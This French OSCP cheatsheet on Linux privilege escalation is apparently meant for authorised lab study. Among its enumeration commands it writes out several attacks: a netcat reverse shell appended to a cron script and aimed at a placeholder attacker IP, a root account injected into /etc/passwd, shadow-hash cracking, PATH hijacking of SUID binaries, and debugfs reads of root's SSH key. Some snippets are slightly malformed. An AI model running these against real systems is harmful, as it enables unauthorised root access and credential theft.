---
title: "OSCP · Élévation de privilèges Linux"
description: "Examiner les permissions, processus et configurations d'un système Linux."
---

# OSCP · Élévation de privilèges Linux

Examiner les permissions, processus et configurations d'un système Linux.

## Énumération

### Afficher l’identité Unix et les groupes

```bash
id
```

### Afficher le nom d’hôte

```bash
hostname
```

### Lire la bannière de connexion locale

Cette bannière peut être personnalisée.

```bash
cat /etc/issue
```

### Identifier la distribution Linux

```bash
cat /etc/os-release
```

### Afficher les informations du noyau et de la machine

```bash
uname -a
```

### Afficher les processus en cours

`ps aux` liste les processus de tous les utilisateurs, avec notamment leur PID, leur propriétaire et leur consommation de ressources. Les détails visibles dépendent des permissions et de la configuration de `/proc`.

```bash
ps aux
```

### Afficher les adresses des interfaces réseau

`ip a` est l'abréviation de `ip address show` ; cette commande affiche les interfaces et leurs adresses, mais **pas** la table de routage.

```bash
ip a
```

### Afficher les sockets et leurs processus

`ss -anp` affiche les sockets sans résolution des noms. L'association aux processus peut être incomplète sans droits suffisants. Pour ne voir que les ports TCP/UDP en écoute, utiliser `ss -tuln`.

```bash
ss -anp
```

### Lire les règles IPv4 sauvegardées par iptables-persistent

Ce fichier n'existe que si les règles ont été sauvegardées à cet emplacement, généralement avec `iptables-persistent`. Il ne reflète pas nécessairement les règles actuellement actives ni les règles `nftables`.

```bash
cat /etc/iptables/rules.v4
```

### Lister les fichiers de planification cron du système

Affiche les fichiers et répertoires dont le nom commence par `/etc/cron`. Cela ne liste pas à lui seul toutes les tâches planifiées.

```bash
ls -lah /etc/cron*
```

### Afficher la crontab de l'utilisateur courant

La commande peut indiquer qu'aucune crontab n'existe pour ce compte.

```bash
crontab -l
```

### Afficher la crontab du compte root

Nécessite une autorisation `sudo` suffisante ; peut demander le mot de passe de l'utilisateur.

```bash
sudo crontab -l
```

### Lister les paquets connus de dpkg

Sur Debian, Ubuntu et les distributions utilisant `dpkg`, affiche la base des paquets et leur état. Cela ne recense pas les programmes installés manuellement hors gestionnaire de paquets.

```bash
dpkg -l
```

### Rechercher les répertoires modifiables par le compte courant

`-writable` teste l'accès en écriture du processus courant, pas une permission d'écriture accordée à tous. La recherche peut être partielle si certains répertoires sont inaccessibles.

```bash
find / -writable -type d 2>/dev/null
```

**Limites de lecture de la mémoire physique**

<p class="oscp-command-note">`/dev/mem` est généralement restreint ; cette recherche ne garantit pas de retrouver des secrets.</p>

```bash
# Nécessite des droits élevés ; souvent bloqué par le noyau
sudo strings -n 10 /dev/mem 2>/dev/null | grep -i 'pass'
```

### Rechercher les chemins indexés contenant « password »

`locate` cherche dans une base de données préalablement construite : les résultats peuvent être anciens ou incomplets. Installer `plocate` ou `mlocate` selon la distribution si la commande est absente.

```bash
locate password | more
```

### Lire les montages configurés dans fstab

Affiche les systèmes de fichiers prévus pour le montage ; une entrée ne signifie pas nécessairement que le volume est monté actuellement.

```bash
cat /etc/fstab
```

### Afficher les montages actifs

```bash
mount
```

### Afficher les périphériques blocs

`lsblk` liste les disques et partitions connus ; il ne recense pas tous les montages réseau.

```bash
lsblk
```

### Lister les modules du noyau chargés

`lsmod` affiche les modules actuellement chargés, pas tous les modules disponibles sur le disque.

```bash
lsmod
```

### Examiner les informations d'un module du noyau

Remplacer `NOM_MODULE` par un module disponible. Le chemin de `modinfo` varie selon la distribution ; invoquer la commande via le `PATH` est plus portable.

```bash
modinfo NOM_MODULE
```

### Rechercher les fichiers dotés du bit SUID

La commande repère les fichiers réguliers dont le bit SUID est positionné. La présence du bit ne démontre pas à elle seule une vulnérabilité.

```bash
find / -perm -u=s -type f 2>/dev/null
```

### Afficher les autorisations sudo du compte courant

`sudo -l` peut demander une authentification. La sortie décrit les commandes autorisées par la politique sudo.

```bash
sudo -l
```

### Ouvrir une session de connexion via sudo

`sudo -i` nécessite que la politique sudo autorise cette opération. Elle ouvre un environnement de connexion du compte cible, généralement root.

```bash
sudo -i
```

**Énumération automatisée**

### Interfaces et connexions

Observer les interfaces, la table de routage et les services à l'écoute sur la machine locale.

Les trois commandes sont indépendantes : `ip -br address` résume les adresses, `ip route` affiche la table de routage principale et `ss -tulpn` liste les sockets TCP/UDP en écoute avec leurs processus lorsque les droits le permettent. `ip` nécessite `iproute2`.

```bash
ip -br address
ip route
ss -tulpn
```

### Volumes et espace disque

Examiner les périphériques et les points de montage.

`lsblk -f` affiche les périphériques blocs et les informations de systèmes de fichiers disponibles ; `df -hT` affiche l'occupation des systèmes de fichiers montés, avec leur type.

```bash
lsblk -f
df -hT
```

### Arbre de processus

Afficher les processus en détail et leurs relations parent-enfant.

`ps auxww` affiche les processus avec des lignes non tronquées ; `ps axjf` présente leur hiérarchie sous forme d'arbre. Les options de `ps` décrites ici sont celles de procps-ng sous Linux.

```bash
ps auxww
ps axjf
```

## Examiner les services

```bash
watch -n 1 "ps auxww | grep -i '[p]ass'"

```

```bash
# Afficher le trafic en clair sur l'interface loopback (si autorisé)
sudo tcpdump -i lo -A | grep -i 'pass'

```

```bash
# Enregistrer le trafic sur toutes les interfaces (droits requis)
sudo tcpdump -i any -s 0 -w capture.pcap
sudo tcpdump -i eth0 -w capture.pcap -n -U -s 0 'not host 10.11.1.111'
sudo tcpdump -vv -i eth0 'not host 10.11.1.111'

```

## Tâches cron

Examiner les permissions et la configuration de Linux.

<p class="oscp-command-note">Cron : rechercher les exécutions dans les journaux accessibles.</p>

```bash
grep "CRON" /var/log/syslog
# Autre possibilité
cat /var/log/cron.log  # Fichier présent uniquement sur certaines distributions

```

<p class="oscp-command-note">Cron : vérifier les droits du script exécuté par la tâche planifiée.</p>

```bash
ls -lah /chemin/vers/script.sh

```

<p class="oscp-command-note">Cron : vérifier d'abord les droits d'écriture sur le script planifié ; ne pas modifier un script sans autorisation.</p>

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [attacker_ip] [listener_port] >/tmp/f" >> /path/to/script.sh

```

<p class="oscp-command-note">Cron : afficher les tâches de l'utilisateur et examiner les répertoires de planification.</p>

```bash
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root

```

### /etc/passwd

<p class="oscp-command-note">OpenSSL : générer un hash de mot de passe pour un compte Unix de laboratoire.</p>

```bash
openssl passwd -6

```

```bash
# Ce n'est qu'un exemple en utilisant la sortie de la commande précédente.
echo"newroot:$6$rounds=656000$6B8ZJQ4aK7G9P/8c$hx0E6ke7zxz1mUMN6LCyRJp2bV5hEE7EowzjEbLXwO6KZV7Ojo0DWg1lzCjLwWg.0tLGfhFe42NnJ8LMtBzD0:0:0:root:/root:/bin/bash">> /etc/passwd

```

<p class="oscp-command-note">Linux : vérifier l'UID et les groupes du compte de test après connexion.</p>

```bash
su newroot

# Vérifier l'accès racine
id

```

### /etc/shadow

<p class="oscp-command-note">Shadow : extraire la ligne d'un compte autorisé (lecture généralement réservée à root).</p>

```bash
sudo grep '^root:' /etc/shadow > root_hash.txt

```

<p class="oscp-command-note">John et Hashcat : tester hors ligne un hash sha512crypt (préfixe `$6$`).</p>

```bash
# Avec John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt root_hash.txt

# Extraire uniquement le hash de la ligne shadow avant Hashcat
cut -d: -f2 root_hash.txt > sha512crypt.hash
hashcat -m 1800 sha512crypt.hash /usr/share/wordlists/rockyou.txt

```

```bash
# Avec John the Ripper
john --show root_hash.txt

# Hashcat
hashcat -m 1800 sha512crypt.hash --show

```

### Binaires SUID

<p class="oscp-command-note">SUID : rechercher les exécutables dont le bit SUID est actif.</p>

```bash
find / -perm -4000 -type f 2>/dev/null

```

<p class="oscp-command-note">SUID : afficher les permissions des exécutables trouvés.</p>

```bash
find / -perm -4000 -type f -exec ls -l {} + 2>/dev/null

```

### Exploitation des binaires setuid

<p class="oscp-command-note">Lister les processus correspondant au nom d'un binaire.</p>

```bash
ps u -C <NOM_BINAIRE>

```

<p class="oscp-command-note">Afficher les UID d'un processus dans `/proc`.</p>

```bash
grep '^Uid:' /proc/<PID>/status

```

<p class="oscp-command-note">`find -exec` : lancer une commande sur les fichiers trouvés, sans élévation automatique.</p>

```bash
find /chemin -type f -exec ls -l {} \;

```

```bash
# Rechercher le binaire ciblé ; la recherche seule n'élève aucun privilège
find / -name '<NOM_BINAIRE>' -type f 2>/dev/null

```

### Capacités Linux (Capabilities)

```bash
getcap -r / 2>/dev/null

```

<p class="oscp-command-note">Afficher les capacités attribuées à un exécutable.</p>

```bash
getcap /chemin/vers/binaire

# Par exemple
getcap /usr/bin/nmap

```

```bash
sudo setcap cap_net_bind_service=ep /chemin/vers/binaire

# Exemple pour ajouter CAP_DAC_OVERRIDE à un binaire
sudo getcap /chemin/vers/binaire

```

```bash
sudo setcap -r /chemin/vers/binaire

# Par exemple
setcap -r /usr/bin/nmap

```

### Capacités et permissions Linux

**CAP_AUDIT_CONTROL**

Allows enabling or disabling kernel auditing. · Can be used to disable auditing mechanisms and evade detection.

**CAP_AUDIT_WRITE**

Allows writing records to the kernel auditing log. · Can be used to manipulate or inject log entries, potentially covering up malicious activities.

**CAP_BLOCK_SUSPEND**

**CAP_CHOWN**

**CAP_DAC_OVERRIDE**

**CAP_DAC_READ_SEARCH**

Bypasses file and directory read and execute permission checks. · Allows reading and searching files and directories that would normally be restricted.

**CAP_FOWNER**

**CAP_IPC_LOCK**

**CAP_KILL**

**CAP_MAC_ADMIN**

**CAP_NET_BIND_SERVICE**

**CAP_NET_RAW**

**CAP_SETGID**

**CAP_SETPCAP**

**CAP_SETUID**

### Cron et minuteurs systemd

Examiner les tâches configurées et les minuteurs systemd, lorsque disponibles.

<p class="oscp-command-note">Cron et minuteurs systemd.</p>

```bash
ls -ld /etc/cron*
systemctl list-timers --all
```

## Risques liés à sudo

Examiner les permissions et la configuration de Linux.

```bash
sudo -l

```

<p class="oscp-command-note">Filtrer les journaux système par nom de processus.</p>

```bash
grep [process_name] /var/log/syslog

```

## Vulnérabilités du noyau

**CVE-2010-3904**

RDS · Linux Kernel <= 2.6.36-rc8 · Exploit

**CVE-2010-4258**

Full Nelson · Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04) · Exploit

**CVE-2012-0056**

Mempodipper · Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64) · Exploit

**CVE-2016-5195**

DirtyCow · Linux Kernel <= 3.19.0-73.8 · Exploit 1 Exploit 2

**CVE-2016-5696**

TCP Remote Code Execution · Linux Kernel 3.6 - 4.7 · Exploit

**CVE-2017-8890**

Race Condition in Linux Kernel · Linux Kernel < 4.11.6 · Exploit

**CVE-2018-8897**

Insecure Use of a Memory Barrier · Linux Kernel 3.14 - 4.15 · Exploit

**CVE-2019-7304**

Race Condition in OverlayFS · Linux Kernel 4.10 - 4.15 · Exploit

**CVE-2021-4034**

PwnKit · Linux Kernel 4.4 - 5.8 · Exploit

**CVE-2020-14386**

Privilege Escalation via OverlayFS · Linux Kernel 4.8 - 5.7 · Exploit

**CVE-2021-3156**

Sudo Privilege Escalation · Sudo versions < 1.9.5p2 · Exploit

**CVE-2021-33034**

Privilege Escalation via the Kernel · Linux Kernel 5.4 - 5.10.4 · Exploit

**CVE-2022-0847**

DirtyPipe · Linux Kernel 5.8 < 5.16.11 · Exploit

## Exploitation des caractères génériques (Wildcards)

<p class="oscp-inline-ref"><strong>Caractère de recherche :</strong> <code>*</code></p>
<p class="oscp-inline-ref"><strong>Caractère de recherche :</strong> <code>?</code></p>
<p class="oscp-inline-ref"><strong>Caractère de recherche :</strong> <code>[]</code></p>
### Exploitation des caractères génériques dans les commandes

<p class="oscp-command-note">Afficher le contenu des répertoires concernés par «Exploitation des caractères génériques dans les commandes».</p>

```bash
ls /var/log/*

```

```bash
# Exemple de script vulnérable
tar -cvf archive.tar.gz /var/log/*

```

### Exploitation des caractères génériques dans les opérations sur les fichiers

```bash
touch /tmp/file_*

```

<p class="oscp-command-note">Copier les fichiers indiqués.</p>

```bash
# Si un attaquant peut modifier des fichiers dans /etc/, il peut exploiter le wildcard pour écraser ou manipuler des fichiers de configuration critiques.
cp /etc/* /tmp/backup/

```

#### Observer l'expansion du shell

Afficher les fichiers qui seraient sélectionnés par * dans un répertoire de laboratoire.

<p class="oscp-command-note">Observer l'expansion du shell.</p>

```bash
printf '%s\n' ./*
```

## Permissions du groupe disk

```text
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow

```

## Élévation de privilèges via MySQL

Examiner les connexions, la configuration et les requêtes de la base de données.

<p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>

```sql
select sys_exec('whoami');
select sys_eval('whoami');

```

## Logiciels installés par l’utilisateur

<p class="oscp-command-note">Chemins de fichiers à examiner pour «Logiciels installés par l’utilisateur» (pas des commandes).</p>

```bash
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/

```

<p class="oscp-command-note">Inventorier les logiciels installés via dpkg sur Debian ou rpm sur Fedora/RHEL.</p>

```bash
# Debian/Ubuntu
dpkg -l

# CentOS/openSUSE/Fedora/RHEL
rpm -qa

# OpenBSD/FreeBSD
pkg_info

```

## Mots de passe faibles, réutilisés ou en clair

Vérifier les comptes, les secrets et les mécanismes d'authentification.

**Paramètres et repères :**
`config.php`  

<p class="oscp-command-note">Exemples de couples compte/mot de passe faibles à examiner (pas des commandes).</p>

```bash
root:root
username:username
username:username1
username:root
username:admin
username:qwerty
username:password

```

```bash
# Anything interesting in the mail folder?
/var/mail
/var/spool/mail

```

```bash
./LinEnum.sh -t -k password

```

### Connexions réseau actives

<p class="oscp-command-note">Examiner les ports et connexions réseau.</p>

```bash
# Liste des services de réseau
netstat -anlp
netstat -ano

```

### Localiser les coffres KeePass

Rechercher uniquement les fichiers .kdbx visibles par le compte courant.

<p class="oscp-command-note">Localiser les coffres KeePass.</p>

```bash
find /home -type f -name '*.kdbx' 2>/dev/null
```

### Répertoires de clés SSH

Rechercher les répertoires .ssh visibles puis examiner leurs permissions.

<p class="oscp-command-note">Répertoires de clés SSH.</p>

```bash
find /home -type d -name '.ssh' 2>/dev/null
```

## Scripts modifiables par tous et exécutés par root

<p class="oscp-command-note">Repérer les fichiers et dossiers aux permissions sensibles.</p>

```bash
# World-writable directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null

# World-executable directories
find / -perm -o x -type d 2>/dev/null

# World-writable and executable directories
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null

```

## Systèmes de fichiers non montés

```bash
mount -l
cat /etc/fstab

```

## Fichiers SUID et SGID

Examiner les permissions et la configuration de Linux.

### Comprendre les permissions SUID et SGID

Examiner les permissions et la configuration de Linux.

### Rechercher les fichiers SUID et SGID

Examiner les permissions et la configuration de Linux.

<p class="oscp-command-note">Repérer les fichiers et dossiers aux permissions sensibles.</p>

```bash
# Trouver des fichiers SUID
find / -perm -u=s -type f 2>/dev/null

# Trouver des fichiers GUID
find / -perm -g=s -type f 2>/dev/null

```

### Évaluer les possibilités d’exploitation

<p class="oscp-command-note">Rechercher les chaînes de caractères lisibles.</p>

```bash
# Option 1 : rechercher les chaînes lisibles avec strings.
strings /path/to/suid-binary

# Option 2 : observer les appels système et les accès aux fichiers.
ltrace /path/to/suid-binary

# Option 3 : étudier si la résolution d'un exécutable via PATH peut modifier le comportement d'un programme SUID.
# Créer une version malveillante du programme attendu
echo '/bin/sh' > /tmp/cp
chmod +x /tmp/cp

# Placer le répertoire du binaire de remplacement en priorité dans PATH
export PATH=/tmp:$PATH

# Exécutez le programme vulnérable SUID
/path/to/suid-program

```

<p class="oscp-command-note">Repérer les fichiers et dossiers aux permissions sensibles.</p>

```bash
# Trouver des fichiers enregistrables SUID
find / -perm -u=s -writable -type f 2>/dev/null

# Si un binaire SUID en écriture est trouvé, vous pouvez injecter votre propre code et l'exécuter avec des privilèges élevés.

```

```bash
# Trouver des scripts dans cronjobs ou répertoires système qui peuvent avoir SUID ou GUID ensemble
find /etc/cron* /var/spool/cron/ -perm -u=s -type f 2>/dev/null

```

#### Lire les dépendances ELF

Identifier les bibliothèques déclarées dans un exécutable sans exécuter le programme.

<p class="oscp-command-note">Lire les dépendances ELF.</p>

```bash
readelf -d <BINAIRE_ELF> | grep NEEDED
```

#### Observer les accès aux fichiers d'un programme

`strace` exécute le programme observé : l'utiliser seulement sur un binaire de laboratoire connu, pour diagnostiquer les chemins et bibliothèques recherchés.

<p class="oscp-command-note">Observer les accès aux fichiers d'un programme.</p>

```bash
strace -f -e trace=file <BINAIRE_DE_TEST> 2>&1 | grep -Ei 'ENOENT|openat|access'
```

#### Afficher les chaînes d'un exécutable SUID

Chercher des références à des chemins et programmes externes sans exécuter le binaire.

<p class="oscp-command-note">Afficher les chaînes d'un exécutable SUID.</p>

```bash
strings <BINAIRE_SUID> | grep -Ei '(/bin/|/usr/|system|exec|sh )'
```

### LinPEAS

**Paramètres et repères :**
`./linpeas.sh`  

```bash
./linpeas.sh | tee linpeas_output.txt

```

<p class="oscp-command-note">Convertir les résultats PEAS en fichiers JSON ou HTML.</p>

```bash
# 1. Télécharger le fichier de la victime à la Kali locale, nous pourrions utiliser les techniques de la section 17.

# 2. Convert .txt to .json.
python3 peas2json.py ./linpeas_output.txt peass.json

# 3. Convert .json to .html.
python3 json2html.py peass.json peass.html

# Facultatif : convertir également le rapport au format PDF.
python3 json2pdf.py peass.json peass.pdf

```

### LinEnum

<p class="oscp-command-note">LinEnum : lancer l'inventaire standard ou une recherche approfondie par mot-clé.</p>

```bash
./LinEnum.sh

# Rechercher les mots de passe
./LinEnum.sh -t -k password

```

```bash
./LinEnum.sh | tee linenum_output.txt

```

### Unix-privesc-check

**Paramètres et repères :**
`./unix-privesc-check.sh`  

```bash
./unix-privesc-check.sh | tee unix_privesc_check_output.txt

```

### Checksec

```bash
checksec --all

```

### Peepdf

```bash
peepdf.py file.pdf

```

### Outil de recherche de vulnérabilités

<p class="oscp-command-note">Exécuter exploit-suggester.py avec les paramètres indiqués pour «Outil de recherche de vulnérabilités».</p>

```bash
python3 exploit-suggester.py

```

## Permissions et traces utiles sur Linux

Ces contrôles en lecture seule permettent de repérer des configurations faibles. Examiner les droits réellement accordés avant de conclure à une possibilité d'élévation de privilèges.

### Répertoires modifiables par tous

Afficher les répertoires ouverts en écriture à d'autres utilisateurs. Un droit d'écriture seul ne constitue pas une vulnérabilité.

<p class="oscp-command-note">Répertoires modifiables par tous.</p>

```bash
find / -type d -perm -0002 -print 2>/dev/null
```

### Fichiers SUID et SGID

Lister les exécutables ayant des permissions SUID ou SGID et distinguer ces deux mécanismes.

<p class="oscp-command-note">Fichiers SUID et SGID.</p>

```bash
find / -type f -perm -4000 2>/dev/null
find / -type f -perm -2000 2>/dev/null
```

### Lire les dernières entrées cron dans syslog

Cette commande demande un `/var/log/syslog` lisible qui reçoit les messages de cron.

```bash
grep -i 'cron' /var/log/syslog | tail -n 30
```

### Lire le fichier principal des exports NFS

Sur le serveur NFS, ce fichier décrit les partages configurés. Des définitions peuvent aussi figurer dans `/etc/exports.d/`.

```bash
cat /etc/exports
```

[Journal de cron](https://manpages.debian.org/trixie/cron/cron.8.en.html) · [Configuration des exports NFS](https://manpages.debian.org/trixie/nfs-kernel-server/exports.5.en.html).

**Référence complémentaire :** [Notes de krovs](https://github.com/krovs/oscp-notes/blob/main/docs/16_linux_privesc.md). Explications rédigées pour SKILL-ISSUE.

<!-- notes-krovs-2026 -->

---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).

<!-- refined-oscp -->
